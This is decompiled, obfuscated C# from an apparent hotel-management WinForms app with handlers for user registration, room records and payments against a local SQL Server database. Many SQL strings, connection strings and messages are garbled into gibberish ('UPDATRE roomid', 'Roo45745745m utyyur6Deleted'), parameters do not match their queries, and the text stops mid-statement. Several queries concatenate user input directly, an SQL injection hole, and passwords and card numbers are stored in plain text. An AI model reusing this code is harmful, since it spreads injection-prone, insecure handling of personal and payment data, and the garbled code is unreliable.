using System;
using System.Collections;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Qb9n3;
using Sw84Mc;
using c6J5Kz;
using e8JYt9;
using g2HAj9;
using g9MJo6;

namespace t1AKx6;

public class r3ZWy7
{
	internal sealed class g9M8Hp
	{
		public string _0024VB_0024Local_Splitter;

		[SpecialName]
		internal bool f6Y8To(char Fo06Zr)
		{
			return Operators.CompareString(Conversions.ToString(Fo06Zr), _0024VB_0024Local_Splitter, false) != 0;
		}
	}

	internal sealed class b8R4Ez
	{
		internal object object_0;

		internal SqlCommand sqlCommand_0;

		internal object object_1;

		internal object object_2;

		internal object object_3;

		internal object object_4;

		internal object object_5;

		internal object object_6;

		internal object object_7;

		internal object object_8;

		internal object object_9;

		internal b8R4Ez()
		{
		}
	}

	internal sealed class Lw20Rx
	{
		internal SqlConnection sqlConnection_0;

		internal SqlCommand sqlCommand_0;

		internal object object_0;

		internal object object_1;

		internal object object_2;

		internal object object_3;

		internal object object_4;

		internal object object_5;

		internal object object_6;

		internal object object_7;

		internal object object_8;

		internal object object_9;

		internal object object_10;

		internal object object_11;

		internal object object_12;

		internal object object_13;

		internal object object_14;

		internal object object_15;

		internal object object_16;

		internal Lw20Rx()
		{
		}
	}

	private object Admin_login;

	private object TextBoxFName;

	private object TextBoxLName;

	private object TextBoxNumber;

	private object TextBoxPassword;

	private object TableAdapterManager;

	private object Database1DataSet;

	private object TextBoxRoom;

	private object ComboBoxRoomAvailable;

	private object Admin_Hmepage;

	private object TextBoxCardNumber;

	private object TextBoxBranch;

	private object PaymentsTableAdapter;

	private Lw20Rx lw20Rx_0 = new Lw20Rx();

	public r3ZWy7()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		object obj = (object)new SqlConnection();
		lw20Rx_0.sqlConnection_0 = (SqlConnection)obj;
		object obj2 = (object)new SqlCommand();
		lw20Rx_0.sqlCommand_0 = (SqlCommand)obj2;
	}

	private void w2H6Ax(object sender, EventArgs e)
	{
		Qx04Lk();
		a6GYz3.Rd7w8L();
	}

	private void b7GKj0(object sender, EventArgs e)
	{
		Qx04Lk();
		Bi18Zt.Ya57Ek();
	}

	private void Yn4r0M(object sender, EventArgs e)
	{
		Qx04Lk();
		NewLateBinding.LateCall(Admin_login, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void b9L1Hc(object sender, EventArgs e)
	{
		//IL_0046: Unknown result type (might be due to invalid IL or missing references)
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Expected O, but got Unknown
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Unknown result type (might be due to invalid IL or missing references)
		lw20Rx_0.sqlConnection_0.set_ConnectionString("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=C:\\Users\\allot\\OneDrive\\Desktop\\Hotel management\\Hotel management\\Database1.mdf;Integrated Security=True");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Empty Id");
			return;
		}
		ICloneable cloneable = (ICloneable)new SqlCommand("UPDATE register SET Firstname = @fname ,Lastname = @lname , Gender= @gender, Phonenumber= @pnumber,  Password=@password WHERE Username = @username", lw20Rx_0.sqlConnection_0);
		((SqlCommand)cloneable).get_Parameters().Add("@fname", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxFName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable).get_Parameters().Add("@lname", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxLName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@gender", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(lw20Rx_0.object_1, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)cloneable).get_Parameters().Add("@pnumber", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable).get_Parameters().Add("@password", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxPassword, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)cloneable).get_Parameters().Add("@username", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		lw20Rx_0.sqlConnection_0.Open();
		if (((SqlCommand)cloneable).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("User Login Details Updated");
		}
		else
		{
			MessageBox.Show("User login Details Not Updated");
		}
		lw20Rx_0.sqlConnection_0.Close();
	}

	private void Ff3b8T(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		object obj = (object)new SqlConnection("Data Source=(LocalDB)\\MSSQLLocalDB;AttachDbFilename=C:\\Users\\allot\\OneDrive\\Desktop\\Hotel management\\Hotel management\\Database1.mdf;Integrated Security=True");
		object obj2 = (object)new SqlCommand("DELETE FROM register WHERE Username = @username", (SqlConnection)obj);
		((SqlCommand)obj2).get_Parameters().Add("@username", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)obj).Open();
		if (((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("User login details Deleted");
		}
		else
		{
			MessageBox.Show("User login details Not Deleted");
		}
		((SqlConnection)obj).Close();
	}

	private void w5XSp6(object sender, EventArgs e)
	{
		d3LYm9.n4E7Cp();
	}

	private void Ei74Gm(object sender, EventArgs e)
	{
		m5ZCt7();
		NewLateBinding.LateCall(lw20Rx_0.object_2, (Type)null, "EndEdit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object tableAdapterManager = TableAdapterManager;
		object[] array = new object[1];
		ref object database1DataSet = ref Database1DataSet;
		array[0] = database1DataSet;
		object obj = array;
		bool[] obj2 = new bool[1] { true };
		object obj3 = obj2;
		NewLateBinding.LateCall(tableAdapterManager, (Type)null, "UpdateAll", array, (string[])null, (Type[])null, obj2, true);
		if ((obj3 as bool[])[0])
		{
			database1DataSet = RuntimeHelpers.GetObjectValue((obj as object[])[0]);
		}
	}

	private void m5ZCt7()
	{
		throw new NotImplementedException();
	}

	private void s8C6Ek(object sender, EventArgs e)
	{
		object object_ = lw20Rx_0.object_3;
		object[] array = new object[1];
		object database1DataSet = Database1DataSet;
		array[0] = NewLateBinding.LateGet(database1DataSet, (Type)null, "Register", new object[0], (string[])null, (Type[])null, (bool[])null);
		object obj = array;
		bool[] obj2 = new bool[1] { true };
		object obj3 = obj2;
		NewLateBinding.LateCall(object_, (Type)null, "Fill", array, (string[])null, (Type[])null, obj2, true);
		if ((obj3 as bool[])[0])
		{
			NewLateBinding.LateSetComplex(database1DataSet, (Type)null, "Register", new object[1] { ((object[])obj)[0] }, (string[])null, (Type[])null, true, false);
		}
	}

	private void i7JLt4(object sender, EventArgs e)
	{
	}

	private void Fd52Wg(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_022b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0231: Expected O, but got Unknown
		//IL_039e: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ea: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			DbConnection dbConnection = (DbConnection)new SqlConnection();
			object obj = (object)new SqlCommand();
			((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).set_ConnectionString("");
			((SqlConnection)dbConnection).Open();
			((SqlCommand)((obj is SqlCommand) ? obj : null)).set_Connection((SqlConnection)(object)((dbConnection is SqlConnection) ? dbConnection : null));
			((SqlCommand)((obj is SqlCommand) ? obj : null)).set_CommandType(CommandType.Text);
			((SqlCommand)((obj is SqlCommand) ? obj : null)).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"'", NewLateBinding.LateGet(lw20Rx_0.object_4, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			object obj2 = ((SqlCommand)((obj is SqlCommand) ? obj : null)).ExecuteReader();
			if (((SqlDataReader)obj2).get_HasRows())
			{
				Interaction.MsgBox((object)"", (MsgBoxStyle)16, (object)null);
				((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
			}
			else
			{
				((SqlConnection)dbConnection).Close();
				((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Open();
				obj = (object)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)" ('", NewLateBinding.LateGet(lw20Rx_0.object_4, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(lw20Rx_0.object_5, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxRoom, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(lw20Rx_0.object_6, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), (object)NewLateBinding.LateGet(lw20Rx_0.object_7, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), NewLateBinding.LateGet(lw20Rx_0.object_8, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(ComboBoxRoomAvailable, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"')")), (SqlConnection)(object)((dbConnection is SqlConnection) ? dbConnection : null));
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_4, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_5, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxRoom, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), (object)(Operators.CompareString(NewLateBinding.LateGet(lw20Rx_0.object_6, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0)), (object)(Operators.CompareString(NewLateBinding.LateGet(lw20Rx_0.object_7, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0)), Operators.CompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_8, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), (object)(Operators.CompareString(NewLateBinding.LateGet(ComboBoxRoomAvailable, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0))))
				{
					MessageBox.Show("");
				}
				else
				{
					((SqlCommand)obj).ExecuteNonQuery();
					Interaction.MsgBox((object)"", (MsgBoxStyle)64, (object)"");
				}
				((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
			}
			((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Gb87Ht(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_020f: Unknown result type (might be due to invalid IL or missing references)
		//IL_021a: Unknown result type (might be due to invalid IL or missing references)
		//IL_022e: Unknown result type (might be due to invalid IL or missing references)
		//IL_023b: Unknown result type (might be due to invalid IL or missing references)
		DbConnection dbConnection = (DbConnection)new SqlConnection("Dated Security=True");
		if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_4, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))
		{
			MessageBox.Show("Empty Id");
			return;
		}
		ICloneable cloneable = (ICloneable)new SqlCommand("UPDATRE roomid = @id", (SqlConnection)dbConnection);
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@boingid", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_5, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@rom", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(TextBoxRoom, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@rooype", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(lw20Rx_0.object_6, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@bedoice", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(lw20Rx_0.object_7, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)cloneable).get_Parameters().Add("@roorice", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_8, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@", SqlDbType.VarChar).set_Value((object)NewLateBinding.LateGet(ComboBoxRoomAvailable, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString());
		((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).get_Parameters().Add("@i", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_4, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)dbConnection).Open();
		if (((SqlCommand)cloneable).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Ro Updsdryyated");
		}
		else
		{
			MessageBox.Show("Rodgeryyted");
		}
		((SqlConnection)((dbConnection is SqlConnection) ? dbConnection : null)).Close();
	}

	private void e1AXq0(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Unknown result type (might be due to invalid IL or missing references)
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		ICloneable cloneable = (ICloneable)new SqlConnection("eryru6i6");
		ICloneable cloneable2 = (ICloneable)new SqlCommand("eryu6u656u= @id", (SqlConnection)cloneable);
		((SqlCommand)cloneable2).get_Parameters().Add("@ityutyutd", SqlDbType.VarChar).set_Value(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(lw20Rx_0.object_4, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)));
		((SqlConnection)cloneable).Open();
		if (((SqlCommand)cloneable2).ExecuteNonQuery() == 1)
		{
			MessageBox.Show("Roo45745745m utyyur6Deleted");
		}
		else
		{
			MessageBox.Show("Room45767557657 N756ot 56765757Deleted");
		}
		((SqlConnection)cloneable).Close();
	}

	private void Yp5y9M(object sender, EventArgs e)
	{
		Qx04Lk();
		NewLateBinding.LateCall(Admin_Hmepage, (Type)null, "Show", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Cj24Fc(object sender, EventArgs e)
	{
		t1N8Ef.n8E6Hg();
	}

	private void Nb79Yc(object sender, EventArgs e)
	{
		m5ZCt7();
		NewLateBinding.LateCall(Ej34Si(), (Type)null, "EndEdit", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		object tableAdapterManager = TableAdapterManager;
		object[] array = new object[1];
		ref object object_ = ref lw20Rx_0.object_9;
		array[0] = object_;
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		Array array3 = obj;
		NewLateBinding.LateCall(tableAdapterManager, (Type)null, "UpdateAll", array, (string[])null, (Type[])null, obj, true);
		if ((array3 as bool[])[0])
		{
			object_ = RuntimeHelpers.GetObjectValue(((object[])array2)[0]);
		}
	}

	private object Ej34Si()
	{
		throw new NotImplementedException();
	}

	private void Ee15Fr(object sender, EventArgs e)
	{
		object object_ = lw20Rx_0.object_10;
		object[] array = new object[1];
		object object_2 = lw20Rx_0.object_9;
		array[0] = NewLateBinding.LateGet(object_2, (Type)null, "Room", new object[0], (string[])null, (Type[])null, (bool[])null);
		Array array2 = array;
		bool[] obj = new bool[1] { true };
		object obj2 = obj;
		NewLateBinding.LateCall(object_, (Type)null, "Fill", array, (string[])null, (Type[])null, obj, true);
		if ((obj2 as bool[])[0])
		{
			NewLateBinding.LateSetComplex(object_2, (Type)null, "Room", new object[1] { ((object[])array2)[0] }, (string[])null, (Type[])null, true, false);
		}
	}

	internal static void p6K1Rg()
	{
		throw new NotImplementedException();
	}

	private void w0FWx2(object sender, EventArgs e)
	{
	}

	private void b4H6Ai(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_0309: Unknown result type (might be due to invalid IL or missing references)
		//IL_0329: Unknown result type (might be due to invalid IL or missing references)
		//IL_0360: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object obj = (object)new SqlConnection();
			ICloneable cloneable = (ICloneable)new SqlCommand();
			((SqlConnection)obj).set_ConnectionString("dsfsdtyu58");
			((SqlConnection)((obj is SqlConnection) ? obj : null)).Open();
			((SqlCommand)cloneable).set_Connection((SqlConnection)((obj is SqlConnection) ? obj : null));
			((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).set_CommandType(CommandType.Text);
			((SqlCommand)cloneable).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"jhjo78jyj", NewLateBinding.LateGet(lw20Rx_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			object obj2 = ((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteReader();
			if (((SqlDataReader)obj2).get_HasRows())
			{
				Interaction.MsgBox((object)"sd46", (MsgBoxStyle)16, (object)null);
				((SqlConnection)obj).Close();
			}
			else
			{
				((SqlConnection)obj).Close();
				((SqlConnection)((obj is SqlConnection) ? obj : null)).Open();
				cloneable = (ICloneable)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"sdgeruii('", NewLateBinding.LateGet(TextBoxFName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxLName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), (object)NewLateBinding.LateGet(lw20Rx_0.object_1, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString()), (object)"','"), NewLateBinding.LateGet(TextBoxNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(lw20Rx_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxPassword, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')")), (SqlConnection)((obj is SqlConnection) ? obj : null));
				if (Conversions.ToBoolean(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.AndObject(Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxFName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxLName, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), (object)(Operators.CompareString(NewLateBinding.LateGet(lw20Rx_0.object_1, (Type)null, "SelectedItem", new object[0], (string[])null, (Type[])null, (bool[])null).ToString(), "", false) == 0)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(lw20Rx_0.object_0, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false)), Operators.CompareObjectEqual(NewLateBinding.LateGet(TextBoxPassword, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"", false))))
				{
					MessageBox.Show("Pleasiuhioujoiijioope enter the dkjfdrew57etails");
				}
				else
				{
					((SqlCommand)((cloneable is SqlCommand) ? cloneable : null)).ExecuteNonQuery();
					Interaction.MsgBox((object)"Succfgxrerssfully Regiuiojojistered.", (MsgBoxStyle)64, (object)"Sugcfy898ccess");
					Qx04Lk();
					Bi18Zt.Ya57Ek();
				}
				((SqlConnection)((obj is SqlConnection) ? obj : null)).Close();
			}
			((SqlConnection)((obj is SqlConnection) ? obj : null)).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"kkkkkpo9", (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Rz25Zg(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c5: Expected O, but got Unknown
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c6: Expected O, but got Unknown
		//IL_02ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fa: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			object obj = (object)new SqlConnection();
			object obj2 = (object)new SqlCommand();
			((SqlConnection)obj).set_ConnectionString("fsjdhfsjdghsuewt89we900tt oierru9w8t ejgj'o9oa8g aljgrii8ag0ir oayttajgh8uuar");
			((SqlConnection)((obj is SqlConnection) ? obj : null)).Open();
			((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).set_Connection((SqlConnection)((obj is SqlConnection) ? obj : null));
			((SqlCommand)((obj2 is SqlCommand) ? obj2 : null)).set_CommandType(CommandType.Text);
			((SqlCommand)obj2).set_CommandText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"select * asffsgseyeurtrturuymentid='", NewLateBinding.LateGet(lw20Rx_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"' ")));
			object obj3 = ((SqlCommand)obj2).ExecuteReader();
			if (((SqlDataReader)obj3).get_HasRows())
			{
				Interaction.MsgBox((object)"Paymurturuent Alrrurueeady Regisrturttyrutered", (MsgBoxStyle)16, (object)null);
				((SqlConnection)obj).Close();
			}
			else
			{
				((SqlConnection)((obj is SqlConnection) ? obj : null)).Close();
				((SqlConnection)obj).Open();
				obj2 = (object)new SqlCommand(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"inserteryreyeyrtutrur into sdfsgrerypayments vtutrurturtualues('", NewLateBinding.LateGet(lw20Rx_0.object_11, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(lw20Rx_0.object_12, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(lw20Rx_0.object_13, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxCardNumber, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"','"), NewLateBinding.LateGet(TextBoxBranch, (Type)null, "Text", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)"')")), (SqlConnection)obj);
